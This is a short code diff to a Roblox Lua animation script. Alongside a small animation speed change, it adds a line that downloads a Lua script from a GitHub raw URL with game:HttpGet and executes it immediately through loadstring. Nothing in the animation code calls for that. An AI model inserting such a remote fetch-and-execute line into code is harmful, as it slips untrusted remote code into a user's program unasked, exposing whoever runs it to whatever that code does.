@@ -421,8 +421,9 @@ Anim:AdjustSpeed(0)
  
 Anim.TimePosition = startTime
  
-Anim:AdjustSpeed(1.35)
- 
+Anim:AdjustSpeed(1.40)
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/tamarixr/tamhub/main/gg.lua")() 
  
     end
  
